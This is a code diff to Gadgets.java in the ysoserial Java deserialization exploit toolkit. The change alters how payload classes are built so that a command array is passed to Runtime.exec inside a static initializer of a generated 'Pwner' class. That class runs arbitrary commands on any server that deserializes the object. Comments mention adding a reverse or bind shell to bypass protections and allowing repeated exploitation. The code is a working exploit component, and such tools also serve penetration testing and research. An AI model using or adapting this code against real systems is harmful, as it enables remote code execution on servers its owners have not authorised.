@@ -9,12 +9,16 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.util.Arrays;
 import java.util.HashMap;
+import java.util.LinkedList;
+import java.util.List;
 import java.util.Map;
 
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import ysoserial.Strings;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -89,7 +93,7 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
+    public static Object createTemplatesImpl ( final String command[] ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
                 command,
@@ -102,7 +106,7 @@ public class Gadgets {
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl ( final String command[], Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
 
@@ -113,9 +117,10 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
+        String cmd = "java.lang.Runtime.getRuntime().exec(new String[] {" + 
+                Strings.join(Arrays.asList(Strings.escapeJavaStrings(command)), ", ", "\"", "\"") + 
+                "});";
+
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
